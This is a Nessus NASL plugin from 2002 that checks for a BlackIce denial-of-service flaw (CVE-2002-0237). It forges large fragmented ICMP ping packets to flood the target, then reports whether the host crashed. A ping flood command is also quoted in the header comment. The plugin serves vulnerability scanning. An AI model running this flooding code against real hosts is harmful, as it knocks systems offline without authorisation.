#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#
# TBD : eEyes gives this "exploit": ping -s 60000 -c 16 -p CC 1.1.1.1
#       But according to others, it doesn't work.

if(description)
{
 script_id(10927);
 script_bugtraq_id(4025);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2002-0237");
 name["english"] = "BlackIce DoS (ping flood)";
 name["francais"] = "Déni de service BlackIce (ping flood)";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash the remote 
machine by flooding it with 10 KB ping packets.

A cracker may use this attack to make this
host crash continuously, preventing you
from working properly.


Solution : upgrade your BlackIce software or remove it.

Risk factor : High";

 desc["francais"] = "Il a été possible de
tuer la machine distante en l'inondant
de paquets ping de taille 10 Ko.

Un pirate peut utiliser ce problème pour
faire planter continuellement cette 
machine, vous empechant ainsi de travailler
correctement.


Solution : mettez à jour votre logiciel BlackIce ou supprimez le.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Ping flood the remote machine and kills BlackIce";
 summary["francais"] = "Tue BlackIce en l'inondant de ping";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 if (ACT_FLOOD) script_category(ACT_FLOOD);
 else		script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 

 script_family(english:family["english"], francais:family["francais"]);
		       
 #script_add_preference(name:"Flood length :", type:"entry", value:"600");
 #script_add_preference(name:"Data length :", type:"entry", value:"10000");
 #script_add_preference(name:"MTU :",  type:"entry", value:"576");
 script_require_keys("Settings/ThoroughTests");
 exit(0);
}

include("global_settings.inc");

if ( ! thorough_tests ) exit(0);

#
# The script code starts here
#

start_denial();

#fl = script_get_preference("Flood length :");
if (! fl) fl = 600;
#dl = script_get_preference("Data length :");
if (! dl) dl = 60000;
#mtu = script_get_preference("MTU :");
if (! mtu) mtu = 1500; 
maxdata = mtu - 20 - 8;	# IP + ICMP
maxdata = maxdata / 8; maxdata = maxdata * 8;
if (maxdata < 16) maxdata = 544;

src = this_host();
dst = get_host_ip();
id = 666;
seq = 0;

for (i = 0; i < fl; i=i+1)
{
 id = id + 1;
 seq = seq + 1;
 for (j = 0; j < dl; j=j+maxdata)
 {
  datalen = dl - j;
  o = j / 8;
  if (datalen > maxdata) {
   o = o | 0x2000;
   datalen = maxdata;
  }
  ##display(string("i=",i,"; j=", j, "; o=", o, ";dl=", datalen, "\n"));
  ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off:o,
                        ip_p:IPPROTO_ICMP, ip_id:id, ip_ttl:0x40,
	     	        ip_src:this_host());
  icmp = forge_icmp_packet(ip:ip, icmp_type:8, icmp_code:0,
	     		  icmp_seq: seq, icmp_id:seq, data:crap(datalen-8));
  send_packet(icmp, pcap_active: 0);
 }
}

alive = end_denial();
if(!alive){
	security_hole();
	set_kb_item(name:"Host/dead", value:TRUE);
}

